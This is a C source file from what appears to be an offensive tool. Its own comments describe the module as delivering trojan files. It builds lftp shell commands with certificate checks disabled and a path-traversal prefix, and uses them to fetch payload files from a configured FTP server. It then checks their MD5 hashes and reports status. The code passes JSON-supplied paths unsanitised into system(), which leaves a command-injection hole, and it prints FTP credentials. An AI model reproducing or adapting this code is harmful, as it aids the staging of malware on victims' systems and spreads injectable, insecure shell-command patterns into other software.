/*
 * mmget.c
 *
 *  Created on: 2019-12-30
 *      Author: andy
 */
#include "pthread.h"
#include "mmget.h"
#include "../utils/common.h"
#include "status.h"
#include "DataProcess.h"
typedef struct mmconfig{
	char lftphost[100];//lftp host user passwd
	char lftplpath[100];//本地存储文件路径
}MMCONFIG;

MMCONFIG g_tmmfile;

MM_FILE_DATA g_tmm_data[MAX_MM_NUM];
/*****************************************************************
 * 函数描述：木马下发初始化，主要实现lftp所需参数的配置读取等初始化
 * 参数：无
 * 返回值： 无
 * ***************************************************************/
void mmget_init()
{
	memset(&g_tmmfile,0,sizeof(MMCONFIG));
	strcpy(g_tmmfile.lftplpath,UserCfgJson.localpath);
	sprintf(g_tmmfile.lftphost,"%s:%s@%s",UserCfgJson.user,UserCfgJson.password,UserCfgJson.ip);
	printf("%s\n",g_tmmfile.lftphost);
}

/*****************************************************************
 * 函数描述：创建木马下发线程
 * 参数：  cJSON* param_mm JSON 木马参数缓存指针
 * 返回值： 无
 * ***************************************************************/
void mmget_thread_start(cJSON* param_mm)
{
	int cnt=0;
	pthread_t pid1;
	cJSON* array_item=NULL;
	int array_size=0;
	char *p=NULL;
	char ftpfile[512];
	cJSON* mmfile = cJSON_GetObjectItem(param_mm, "paths");//获取文件路径
	if(mmfile == NULL){
		return ;
	}
	memset(g_tmm_data,0,sizeof(MM_FILE_DATA)*MAX_MM_NUM);
	array_size = cJSON_GetArraySize(mmfile);
	if(array_size > MAX_MM_NUM){
		printf("mm num too much\n");
	}
	for (cnt=0;cnt<array_size;cnt++){
		array_item = cJSON_GetArrayItem(mmfile, cnt);
		if (array_item != NULL){
			strcpy(g_tmm_data[cnt].md5string,strtok(array_item->valuestring,":"));
			strcpy(g_tmm_data[cnt].ftpfile,strtok(NULL,":"));
			strcpy(ftpfile,g_tmm_data[cnt].ftpfile);
			strtok(ftpfile,"/");
			while((p=strtok(NULL,"/"))!= NULL){
				strcpy(g_tmm_data[cnt].filename,p);
			}
			printf("%s %s %s\n",g_tmm_data[cnt].filename,g_tmm_data[cnt].ftpfile,g_tmm_data[cnt].md5string);
		}
	}
	pthread_create(&pid1, NULL, (void *)mmget_file, (void *)cnt);
	usleep(1000);
	pthread_detach(pid1);
}
/*****************************************************************
 * 函数描述：木马文件获取，用于从服务器下发木马文件
 * 参数：	   void* 缓存指针
 * 返回值： 无
 * ***************************************************************/
void *mmget_file(void* argv)
{
	char optpath[1024];
	char cmpmd5string[128];
	//char ftpfile[64];
	char update[512];
	int data_size=(int)argv;

	memset(optpath,0,sizeof(optpath));
	memset(cmpmd5string,0,sizeof(cmpmd5string));
	//memset(ftpfile,0,sizeof(ftpfile));
	memset(update,0,sizeof(update));
	for (int cnt=0;cnt<data_size;cnt++){
			//sprintf(optpath,"lftp -c 'lftp %s ;lcd %s ; get %s ; exit'",g_tmmfile.lftphost,g_tmmfile.lftplpath,g_tmm_data[cnt].ftpfile);
			sprintf(optpath,"lftp -c 'set ssl:verify-certificate no;set xfer:clobber on;lcd %s ;get ftp://%s:21../../..%s; exit'",g_tmmfile.lftplpath,g_tmmfile.lftphost,g_tmm_data[cnt].ftpfile);
			printf("%s\n",optpath);

			sprintf(update,"status-downloading/detail:%s",g_tmm_data[cnt].filename);
			update_status("wifiMMFiles", update, NULL);
			status_report();
			printf("%s\n",optpath);
			system(optpath);//ftps 下载文件
			memset(optpath,0,sizeof(optpath));
			printf("%s\n",optpath);
			sprintf(optpath,"md5sum %s%s|awk '{print $1}'",g_tmmfile.lftplpath,g_tmm_data[cnt].filename);
			sys_get(optpath, cmpmd5string, sizeof(cmpmd5string));//获取文件MD5值
			if(strcmp(cmpmd5string,g_tmm_data[cnt].md5string) == 0){//比较MD5
				sprintf(update,"result-succ/detail:%s",g_tmm_data[cnt].filename);
				update_status("wifiMMFiles", update, NULL);
			}
			else{
				sprintf(update,"result-fail/detail:%s",g_tmm_data[cnt].filename);
				update_status("wifiMMFiles", update, NULL);
			}
			status_report();
	}
	return NULL;
}
